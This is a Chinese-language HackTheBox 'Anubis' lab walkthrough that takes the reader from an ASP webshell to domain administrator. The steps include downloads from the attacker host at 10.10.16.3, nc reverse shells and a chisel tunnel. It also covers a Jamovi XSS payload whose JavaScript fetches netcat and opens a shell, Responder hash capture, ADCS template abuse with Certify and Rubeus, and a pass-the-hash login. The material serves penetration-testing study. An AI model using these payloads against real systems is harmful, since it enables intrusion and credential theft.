@@ -1,0 +1,560 @@
+![](https://image.3001.net/images/20221019/1666141449_634f4d0900f128bff6b9f.gif!small)
+
+> 大家好，我是你们好朋友小峰。预计从今天开始，陆陆续续为大家推出 CTF-Horizontall HackTheBox 系列文章。
+
+###
+![](https://image.3001.net/images/20221019/1666143545_634f5539b4fa2a2bc2bd0.jpeg!small)
+
+### 0x01 简介
+
+Anubis是由作者4ndr34z在HackTheBox平台上设计，难度相对较高的靶场。该靶场知识点内容涵盖上传ASP webshell、突破容器、然后在
+jamovi 中利用 XSS漏洞获取用户帐户并最终针对 ADCS（Active Directory 证书服务）进行权限升级的利用的真实场景。
+
+### 靶场知识链条
+
+ **1.1信息收集**
+
+Ønmap
+
+ **1.2目录枚举**
+
+Ø目录/文件枚举
+
+Ø带有 VBScript 注入的联系页面
+
+ **1.3渗透测试**
+
+Ø联系页面上的 ASP Webshell
+
+Ø打破 Windows 容器
+
+Ø跨站脚本漏洞CVE-2021-28079 – Jamovi <= 1.16.18
+
+ **1.4权限提升**
+
+·ADCS 域升级（认证二手研究论文）
+
+·重新配置 Web 模板
+
+·注册管理员以获得证书
+
+·使用 Rubeus 揭示管理员的 NTLM 哈希
+
+·祝贺拿到root用户flag文件
+
+让我们开始
+
+### 0x02 网络扫描
+
+分配给这台机器的 IP 是 10.129.95.208。Nmap 扫描显示一个网站在端口 443 上运行。首先在我们的 hosts 文件中添加了该网站
+SSL 证书中提到的通用名称，用于 DNS 路由。（如图2.1所示）
+
+    
+    
+    nmap -sV -sC -Pn 10.129.95.208
+    echo "10.129.95.208 www.windcorp.htb" >> /etc/hosts
+
+![](https://image.3001.net/images/20221019/1666141956_634f4f04a2ad30c6004df.png!small)
+
+图2.1 nmap端口扫描
+
+### 0x03 目录枚举
+
+枚举目录后，我们找不到任何有价值的目录页面，除了页面以 *.asp 结尾的文档页面，通过服务搭建猜测后台有一个 Windows
+服务器运行。持续利用工具枚举目标网站将我们带到了联系页面，该页面显示可以以文本方式输入任何内容。因此，我尝试在消息正文中输入一个基本的VBScript，vbscript脚本可以把当前访问的cookie名称更改为
+Harshit。（如图3.1所示）![](https://image.3001.net/images/20221019/1666142000_634f4f302d90542f7f717.png!small)
+
+图3.1 插入cookie脚本代码
+
+我们发现服务器试图写入一个
+cookie时它抛出了一个错误，但这开辟了利用范围。（如图3.2所示）![](https://image.3001.net/images/20221019/1666142016_634f4f4086da03093538c.png!small)
+
+图3.2 写入脚本代码页面报错
+
+### 0x04 开发
+
+Kali 自带一个功能非常强大的 ASP webshell，脚本目录位置位于
+/usr/share/webshells/asp/cmdasp.asp，我们对其进行了简单修改之后，然后上传到服务器上。您可以直接使用已经修改完成的脚本，如下（如图4.1所示）
+
+> <%
+>
+> Dim oScriptDim oScriptNetDim oFileSys, oFileDim szCMD, szTempFileOn Error
+> Resume NextSet oScript = Server.CreateObject("WSCRIPT.SHELL")Set oScriptNet
+> = Server.CreateObject("WSCRIPT.NETWORK")Set oFileSys =
+> Server.CreateObject("Scripting.FileSystemObject")szCMD =
+> Request.Form(".CMD")If (szCMD <> "") ThenszTempFile = "C:\" &
+> oFileSys.GetTempName( )Call oScript.Run ("cmd.exe /c " & szCMD & " > " &
+> szTempFile, 0, True)Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False,
+> 0)End If%>
+
+![](https://image.3001.net/images/20221019/1666142057_634f4f690613f830efe5f.png!small)
+
+图4.1 编写恶意webshell脚本文件
+
+通过联系页面插入后，我们看到现在已将其转换为RCE漏洞。现在通过运行一个简单的命令whoami来测试它（如图4.2所示）![](https://image.3001.net/images/20221019/1666142083_634f4f83cd1702a762952.png!small)
+
+图4.2 运行脚本命令语句
+
+由于目标网站为windows服务器，所以我们提前在攻击机上传一个window
+netcat，然后利用系统python启动一个web服务器，然后利用靶场访问攻击机下载我们上传好nc工具，最终通过失陷主机使用powershell命令下载执行。（如图4.3所示）
+
+> python3 -m http.server 80
+
+![](https://image.3001.net/images/20221019/1666142108_634f4f9c7fcdf28cdef5d.png!small)图4.3
+python启动web服务器
+
+在接收端，我们输入以下命令 powershell one-liner 将这个 exe 保存在受害者桌面上（如图4.4所示）
+
+> powershell -c iwr http://10.10.16.3/nc64.exe -outf
+> \Users\Administrator\Desktop\nc64.exe
+
+![](https://image.3001.net/images/20221019/1666142216_634f50087c31b779068d7.png!small)图4.4
+利用powershell下载nc可执行文件
+
+最后我们在攻击机上设置端口 1337 为监听器，使用 powershell 启动nc64.exe，你可以看到我们收到了一个反向
+shell！（如图4.5所示）（如图4.6所示）
+
+> start \Users\Administrator\Desktop\nc64.exe 10.10.16.3 1337 -e cmd.exe
+>
+> nc -nlvp 1337
+
+![](https://image.3001.net/images/20221019/1666142253_634f502dd08a2d7112b93.png!small)图4.5
+执行nc可执行文件![](https://image.3001.net/images/20221019/1666142317_634f506d4f972cdb33f9a.png!small)
+
+图4.6 kali接收windows返回shell
+
+运行 whoami 后，我们看到我们具有管理员访问权限。当我们检查 C:\users
+目录时，我们发现我们当前在一个容器中。（如图4.7所示）![](https://image.3001.net/images/20221019/1666142348_634f508c00f46db39e46a.png!small)
+
+图4.7 检查 C:\users 目录文件
+
+通过渗透测试以往的经验，我们第一步是在系统上尽可能多收集信息，只有信息收集足够全，对我们下一步渗透会起到至关重要的角色，所以，我们在盘里各种探索，发现在Desktop上观察到了一个
+req.txt，查看它是一个证书导出。（如图4.8所示）
+
+![](https://image.3001.net/images/20221019/1666142363_634f509b60a7ff5a46039.png!small)
+
+图4.8 查看桌面req.txt文件
+
+我们将其复制到本地系统并使用 openssl 命令对其进行解密
+
+> openssl req -in req.txt -text
+
+我们发现了一个通用名称参数 (CN) 设置为 softwareportal.windcorp.htb（如图4.9所示）
+
+![](https://image.3001.net/images/20221019/1666142391_634f50b70edd80993d5ab.png!small)
+
+图4.9 使用 openssl 命令对其进行解密
+
+这个 CN需要我们多注意，因为在我们目录枚举中没有找到这个子域名。因此，我们也在主机文件中添加了这个子域，但机器仍然无法访问它。（如图4.10所示）
+
+![](https://image.3001.net/images/20221019/1666142409_634f50c98e869de626fc6.png!small)图4.10
+访问windcorp.htb子域
+
+可以明确得出结论，这是一个在容器内运行的内部网站，我们需要搭建一个隧道来访问它。我们用代理工具
+chisel来做到这一点。我们下载了windows二进制文件并启动了一个python服务器（如图4.11所示）![](https://image.3001.net/images/20221019/1666142438_634f50e6389f49651ca37.png!small)
+
+图4.11 查看代理工具 chisel
+
+在受害者的机器上，我们使用 curl 将其下载到桌面（如图4.12所示）
+
+> curl http://10.10.16.3/chisel.exe -outfile chisel.exe
+
+![](https://image.3001.net/images/20221019/1666142463_634f50ff5229554fdf30d.png!small)
+
+图4.12 将chisel代理文件上传window
+
+我们可以使用apt包管理器在kali中安装chisel代理工具。然后我们需要启动一个服务器。（如图4.13所示）
+
+> apt install chisel
+>
+> chisel server -p 8001 --reverse
+
+![](https://image.3001.net/images/20221019/1666142491_634f511b491d25ba071d6.png!small)
+
+图4.13 执行chisel代理文件监听
+
+在我们的受害者的机器中，我们需要以客户端模式将chisel连接到这个服务器
+
+> .\chisel.exe client 10.10.16.3:8001 R:socks
+
+如你所见，chisel
+现在已连接到此服务器（如图4.14所示）![](https://image.3001.net/images/20221019/1666142518_634f5136cd851e1b4c39c.png!small)
+
+图4.14 chisel连接此服务器
+
+在我们的服务器中，我们看到端口 1080
+被用作隧道。（如图4.15所示）![](https://image.3001.net/images/20221019/1666142542_634f514e9f56a7a849f13.png!small)
+
+图4.15 代理文件启动并监听
+
+默认情况下，chisel 使用 socks5 代理。因此，我们转到攻击机kali下 proxychains.conf 文件并将此 IP 和端口添加为
+socks5 隧道。请注意，proxychain已预先安装在 kali 中，但可以使用 apt 安装。我注释掉了 socks4
+行，因为socks5是升级版本支持协议更多一些，所以这里不使用socks4搭建代理。（如图4.16所示）![](https://image.3001.net/images/20221019/1666142563_634f51639902ec63a13dd.png!small)
+
+图4.16 更改kali的proxychains代理配置
+
+此外，在我们的受害者机器中，我们将容器的默认网关记住为
+172.22.32.1（如图4.17所示）![](https://image.3001.net/images/20221019/1666142665_634f51c9bda9d1a22bc53.png!small)
+
+图4.17 查看windows中ip地址
+
+因为 softwareportal 网页在容器中，所以我们需要在我们的 hosts
+文件中添加这个条目，以使我们的系统解析名称。（如图4.18所示）![](https://image.3001.net/images/20221019/1666142686_634f51de7bdf4a8668790.png!small)
+
+图4.18 修改hosts中解析记录
+
+之后，我们可以使用curl访问这个网页，发现我们可以成功访问网页。（如图4.19所示）
+
+> proxychains curl http://softwareportal.windcorp.htb
+
+![](https://image.3001.net/images/20221019/1666142708_634f51f4cd714d00cb89c.png!small)
+
+图4.19 使用代理访问windcorp子域名
+
+在终端中仔细阅读网页代码后，我们发现网页 install.asp 有一个 WinRM超链接，可以发现作用是试图在指定的 IP
+中安装特定软件。（如图4.20所示）
+![](https://image.3001.net/images/20221019/1666142729_634f52098879d56dcccdc.png!small)
+
+图4.20 源代码发现安装链接
+
+这里值得注意的是，当服务器解析域林中的系统时，首先是对其进行身份验证。这意味着我们可以使用responder工具来捕获执行此功能的用户的 NTLM
+哈希。为此，我们设置了一个响应者监听器（如图4.21所示）
+
+responder工具：
+
+https://github.com/SpiderLabs/Responder
+
+> responder -I tun0
+
+![](https://image.3001.net/images/20221019/1666142754_634f5222b34ae08121a89.png!small)
+
+图4.21 使用responder工具监听
+
+现在，我们将使用我自己的 IP 切换该 URL 中的客户端 IP，并使用 curl 向它发送请求。（如图4.22所示）
+
+> proxychains curl
+> http://softwareportal.windcorp.htb/install.asp?client=10.10.16.3&software=VNC-> Viewer-6.20.529-Windows.exe
+
+![](https://image.3001.net/images/20221019/1666142779_634f523b14d4ba46d04ac.png!small)  
+图4.22 修改访问地址并访问安装地址
+
+在我们的响应程序中，我们可以看到我们能够捕获用户 localadmin 的 NTLMv2
+哈希。所以使用这个方式是正确的。（如图4.23所示）![](https://image.3001.net/images/20221019/1666142840_634f52789973c272e64be.png!small)
+
+图4.23 捕获用户localadmin的ntlmv2哈希
+
+我们将其复制到一个文件中，并尝试使用 john 和 wordlist rockyou.txt
+来破解它。通过简短的时间破解从该文件中找到了密码。（如图4.24所示）
+
+![](https://image.3001.net/images/20221019/1666142855_634f5287650cf14c71399.png!small)
+
+图4.24 破解hash密码
+
+由于没有运行 SSH 或类似服务，我们使用此凭证来检查 SMB 共享。
+
+> smbmap -H 10.129.95.208 -u localadmin -p Secret123smbmap -H 10.129.95.208 -u
+> localadmin -p Secret123 -R Shared
+
+我们在这里需要注意3件重要的事情。首先，创建了 CertEnroll
+共享，这可能意味着需要我们身份验证。其次，该用户可以访问一个名为“Shared”的共享，第三，系统上安装了 jamovi。（如图4.25所示）
+
+![](https://image.3001.net/images/20221019/1666142878_634f529e9bb741e798ab0.png!small)
+
+图4.25 利用账号密码连接linux主机
+
+由于作者4ndr34z 最近在 Jamovi <=1.6.18 (CVE 2021-28079) 中发现了 XSS 漏洞，因此我们猜测到作者可能会利用
+jamovi，然后我们可以进一步提升权限。（如图4.26所示）
+
+![](https://image.3001.net/images/20221019/1666142899_634f52b3d1fee544ca266.png!small)
+
+图4.26 查看cve-2021-28097漏洞
+
+通过参考作者在github上的帖子和这个参考视频，我们可以在一个OMV文档的name参数中输入一个脚本。Jamovi 类似于任何 Microsoft
+Office 文档，因为它是包含在 *.omv 扩展名中的多个文档的存档。所以，接下来我们需要做这两点：
+
+·下载 Whatif.omv，并解压。
+
+·在 metadata.json 中的名称字符串中注入一个修改后的脚本 jamovi.js，该脚本从我们的服务器下载 netcat 并返回一个反向
+shell
+
+为此，我们使用 smbclient 登录共享并遍历保存 jamovi 分析文件的目录并下载 Whatif.omv（如图4.27所示）
+
+> smbclient //10.129.95.208/Shared -U localadmin
+
+![](https://image.3001.net/images/20221019/1666142922_634f52cabfb5f09d68be7.png!small)图4.27
+smbclient 登录共享并遍历
+
+我们现在可以解压这个 omv 文件。如你所见，此存档中有各种文件。（如图4.28所示）
+
+![](https://image.3001.net/images/20221019/1666142938_634f52da4d67dfc55daa7.png!small)
+
+图4.28 解压这个 omv 文件
+
+我们修改了 metadata.json 并在易受攻击的“name”参数中插入了以下代码
+
+> <script src=http://10.10.16.3/jamovi.js></script>
+
+此外，我们使用以下代码创建一个新的 JS 文件 jamovi.js：
+
+> const ignite = require("child_process");
+>
+> ignite.exec("powershell -c iwr http://10.10.16.3/nc64.exe -outf
+> \\\windows\\\system32\\\spool\\\drivers\\\color\\\nc64.exe");
+>
+> ignite.exec("start
+> \\\windows\\\system32\\\spool\\\drivers\\\color\\\nc64.exe 10.10.16.3 4444
+> -e cmd.exe");
+
+您可以在此处（https://nodejs.org/api/child_process.html）参考有关 child_process 和 exec 命令的
+node.js 文档。基本上，这个 JS 文件将从我的服务器下载 nc64.exe 并在端口 4444 上运行服务器。（如图4.29所示）
+
+![](https://image.3001.net/images/20221019/1666142978_634f5302ced9b881c1450.png!small)
+
+图4.29 查看jamovi.js文件代码
+
+在 metadata.json 中完成修改后，你需要从文件夹中删除原始 Whatif.omv 并再次将其压缩回来（如图4.30所示）
+
+> zip -r Whatif.omv *
+
+![](https://image.3001.net/images/20221019/1666142999_634f531736c686ad533a7.png!small)图4.30
+Whatif.omv 并再次将其压缩
+
+现在，我们将 jamovi.js 和 nc64.exe 放在同一个文件夹中并启动我们的 python 服务器（如图4.31所示）
+
+![](https://image.3001.net/images/20221019/1666143022_634f532e782c046505aec.png!small)
+
+图4.31 启动python 服务器
+
+完成后，我们需要手动将 Whatif.omv 再次放回同一目录并等待它执行。（如图4.32所示）
+
+> smbclient //10.129.95.208/Shared -U localadmindel Whatif.omvput Whatif.omv
+
+![](https://image.3001.net/images/20221019/1666143057_634f5351d19ea73259cde.png!small)
+
+图4.32 smbclient登录客户端
+
+现在，我们需要在端口 4444 上启动一个反向端口监听并等待连接。4-5 分钟后，我们看到来自用户 diegocruz 的连接。（如图4.33所示）
+
+![](https://image.3001.net/images/20221019/1666143078_634f53664ca0592e976ac.png!small)
+
+图4.33 反向端口监听并成功
+
+### 0x05 权限提升
+
+经过对系统的信息收集以后，似乎没有找到可以利用的信息。最后，我们记得机器上运行的“Cert
+Enroll”共享。我们检查并确认证书注册服务正在运行（如图5.1所示）
+
+![](https://image.3001.net/images/20221019/1666143101_634f537d7bdb4866e2d49.png!small)
+
+图5.1 使用certutil查看证书
+
+有篇文章描述涵盖了使用黄金证书的域持久性
+
+（https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/），其中解释了有关 ADCS（Active Directory 证书服务）和伪造黄金票据以保持域上的持久性的一些基础知识。
+
+根据本文的指导，我检查了用户 Diego Cruz 是否可以注册证书。（如图5.2所示）
+
+> certutil -catemplates
+
+![](https://image.3001.net/images/20221019/1666143127_634f5397a7eac7ece72c6.png!small)
+
+图5.2 查看注册证书
+
+看起来 Diego Cruz 实际上可以在 Web 模板注册证书。
+
+首先，我们需要为此攻击下载 Certify.exe 和
+Rubeus.exe。可以在此处（https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_x64）的
+SharpCollection 存储库中找到已编译的可执行文件。然后我启动我的 python 网络服务器。（如图5.3所示）
+
+![](https://image.3001.net/images/20221019/1666143145_634f53a956c7c5fa600b0.png!small)
+
+图5.3 编译的可执行文件
+
+我们现在可以像以前一样使用 Powershell 的 IWR 来下载它（如图5.4所示）
+
+> Invoke-WebRequest "http://10.10.16.3:8000/Certify.exe" -OutFile
+> "C:\users\diegocruz\Desktop\Certify.exe"
+
+![](https://image.3001.net/images/20221019/1666143163_634f53bb62ba4ec6034ee.png!small)
+
+图5.4 下载certify文件
+
+Rubeus也一样（如图5.5所示）
+
+> Invoke-WebRequest "http://10.10.16.3/Rubeus.exe" -OutFile
+> "C:\users\diegocruz\Desktop\Rubeus.exe"
+
+![](https://image.3001.net/images/20221019/1666143182_634f53ce82971c04756fc.png!small)
+
+图5.5 下载rebeus文件
+
+现在，我们首先需要检查 Web 模板并查看其配置。
+
+> .\Certify.exe find
+
+向下滚动以找到 Web 模板。它看起来像这样（如图5.6所示）
+
+![](https://image.3001.net/images/20221019/1666143200_634f53e0ee44eb8372b24.png!small)
+
+图5.6 查看web模板
+
+Microsoft 说明文档显示 ENROLLEE_SUPPLIES_SUBJECT 标志集意味着用户可以指定自定义 SAN。（如图5.7所示）
+
+![](https://image.3001.net/images/20221019/1666143218_634f53f24267b07e8634e.png!small)
+
+图5.7 microsoft 说明san文档
+
+而且，能够提供自定义 SAN 意味着用户可以复制域中的任何用户！（如图5.8所示）
+
+![](https://image.3001.net/images/20221019/1666143232_634f54007e2b9e90481a9.png!small)
+
+图5.8 microsoft 说明san文档
+
+目前只有一个问题，目前这个网页模板只能用于服务器认证。为了能够请求管理员证书，我们需要具有权限登录功能（允许用户请求证书）。但是，Diego Cruz
+可以完全控制此 Web 模板，因此需要编辑此模板并添加权限登录功能。
+
+我们将使用三个脚本来实现这一点。PowerView、PoshADCS 和reconfiguretemplate.ps1
+
+ADCS.ps1 脚本的作用是，如果用户可以控制这些属性，它有助于在证书模板上设置这些突出显示的属性。
+
+Reconfiguretemplate.ps1 脚本使用 ADCS 的函数 Set-ADCSTemplate 来有效地设置这些属性。我们只需要在此处列出
+Smart Card Logon 的 EKU（增强型密钥使用）。这些 EKU 可在 Microsoft 的网站上找到。对于智能卡登录，EKU 为：OID
+1.3.6.1.4.1.311.20.2.2，将在 mspki-certificate-name-flag 属性中提供（如图5.9所示）
+
+> $Properties = @{}$Properties.Add('mspki-certificate-name-> flag',1)$Properties.Add('pkiextendedkeyusage',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))$Properties.Add('msPKI-> Certificate-Application-> Policy',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))$Properties.Add('flags','CLEAR')$Properties.Add('mspki-> enrollment-flag',0)$Properties.Add('mspki-private-key-> flag',256)$Properties.Add('pkidefaultkeyspec',1)Set-ADCSTemplate -Name Web
+> -Properties $Properties -Force
+
+![](https://image.3001.net/images/20221019/1666143258_634f541a3ff107ca03045.png!small)
+
+图5.9 使用 ADCS 的函数脚本
+
+现在，我们需要下载这些脚本并将其作为 IEX cmdlet 导入服务器。鉴于我们的 python 服务器已经处于活动状态，我们可以这样做，然后最后运行
+Certify.exe find 命令来查找所有现在处于活动状态的模板：（如图5.10所示）
+
+> Invoke-WebRequest "http://10.10.16.3/PowerView.ps1" -OutFile
+> "C:\users\diegocruz\Desktop\PowerView.ps1"Invoke-WebRequest
+> "http://10.10.16.3/ADCS.ps1" -OutFile
+> "C:\users\diegocruz\Desktop\ADCS.ps1"Invoke-WebRequest
+> "http://10.10.16.3/reconfiguretemplate.ps1" -OutFile
+> "C:\users\diegocruz\Desktop\reconfiguretemplate.ps1"cat -raw PowerView.ps1 |
+> iexcat -raw ADCS.ps1 | iexcat -raw reconfiguretemplate.ps1 |
+> iex.\Certify.exe find
+
+![](https://image.3001.net/images/20221019/1666143285_634f5435e57c99a015237.png!small)
+
+图5.10 利用certify查找活动状态
+
+现在，我们再次向下滚动并尝试查找 Web 模板。会观察到各列的外观有何不同。我们已设法将智能卡权限登录功能添加到此模板。（如图5.11所示）
+
+![](https://image.3001.net/images/20221019/1666143304_634f54483de24e9f2c437.png!small)
+
+图5.11 添加登录功能权限
+
+现在，我们的模板已经准备好了。Diego Cruz 现在可以通过冒充任何用户来请求证书。他只需要提供一个主题替代名称。Certify.exe 可以使用
+/altname:<user to be requested> 执行此操作，（如图5.12所示）
+
+> .\certify.exe request /ca:earth.windcorp.htb\windcorp-CA /template:Web
+> /altname:Administrator
+
+可以看到，我们已经成功获得了管理员证书！
+
+![](https://image.3001.net/images/20221019/1666143349_634f5475b1c45a3834456.png!small)
+
+图5.12 获取管理员证书
+
+证书请求 ID 也可以在此处注明，因为 certify 中的 /id:<> 选项只需提供此 ID
+即可重新请求相同的证书。继续向下看，我们看到我们生成的证书在 *.pem 扩展名中。Microsoft 使用 *.pfx，因此我们需要使用 openssl
+将其转换为 pfx 格式。为此，我们将下载该证书的副本（开始复制“BEGIN RSA KEY”并在“END CERTIFICATE”处结束）并在我们的
+Kali 机器中保存为 cert.pem。
+
+然后我们可以使用 openssl 将其转换为 pfx，
+
+> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic
+> Provider v1.0" -export -out cert.pfx
+
+这将为您提供 cert.pfx 作为输出。我在导出此证书时添加了一个简单的密码 123。（如图5.13所示）
+
+![](https://image.3001.net/images/20221019/1666143369_634f54898b577053f9209.png!small)
+
+图5.13 添加简单密码 123
+
+我们需要将它复制到受害机器上并运行 Rubeus asktgt 命令来请求用户管理员的 Ticket Granting Ticket，该 Ticket
+Granting Ticket 可用于进行 pass a ticket 攻击。Rubeus 提供的一个选项是它可以使用 /getcredentials
+选项直接转储 NTLM 哈希
+
+> Invoke-WebRequest "http://10.10.16.3/cert.pfx" -OutFile
+> "C:\users\diegocruz\Desktop\cert.pfx".\Rubeus.exe asktgt /user:Administrator
+> /certificate:C:\users\diegocruz\Desktop\cert.pfx /password:123
+
+如你所见，我们已成功获得 kirbi 票据！（如图5.14所示）
+
+![](https://image.3001.net/images/20221019/1666143386_634f549a0936ec2c36c1c.png!small)
+
+图5.14 获得 kirbi 票据
+
+在向下滚动时，我们看到 Rubeus 也成功地提取了管理员的 NTLM 哈希！（如图5.15所示）
+
+![](https://image.3001.net/images/20221019/1666143399_634f54a7e06bd77f67538.png!small)
+
+图5.15 提取管理员NTLM哈希
+
+接下来可以传递哈希并以管理员身份登录。这可以使用 impacket 的 psexec 来完成
+
+> python3 /home/kali/impacket/examples/psexec.py -hashes
+> 3CCCXXXXXXXXXXXXXXXXXXXXXXXXXXXX:3CCCXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+> administrator@10.129.95.208 cmd.exe
+
+我们获得了一个管理会话并查看root标志！（如图5.16所示）
+
+![](https://image.3001.net/images/20221019/1666143417_634f54b9b303f59311e7c.png!small)
+
+图5.16 读取root标志文件
+
+### 0x06 参考链接
+
+https://jishuin.proginn.com/p/763bfbd66445
+
+https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/
+
+### 0X07结论
+
+本系列准备开启国内外安全靶场渗透测试系列，也欢迎大家投稿包括但不限于VulnStack、Vulnhub、HTB、自行搭建系列靶场。通过靶场快速带领大家学习红队各系列知识。
+
+红日安全长期、短期项目招聘：Hvv、重保、安服、培训等项目
+
+文章投稿&项目招聘邮箱：
+
+annapeng2021@163.com
+
+同样感谢一直在安全圈中深耕着的每一位hacker
+
+描下方二维码，期待加入红日安全交流群：
+
+![](https://image.3001.net/images/20221018/1666056982_634e031693b6f2c026e58.jpeg!small)
+
+  
+
+  
+
+  
+
+有幸一起并肩前行，有幸一起见证着“红日”成长。在大家身上我已经收获得足够多了，是时候用实际行动向安全世界说声谢谢了。
+
+作者：小峰
+
+编辑：小jia
+
+  
+
+ ** **红日安全出品|转载请注明来源****
+
+文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担
+
+（来源：红日安全）
+
+![](https://image.3001.net/images/20221018/1666056924_634e02dc4efa0f45b1aa2.jpeg!small)![](https://image.3001.net/images/20221018/1666057020_634e033c860812e3b8c9b.png!small)
+
+海量安全课程请点击以下链接
+
+http://www.qiyuanxuetang.net/courses/
+
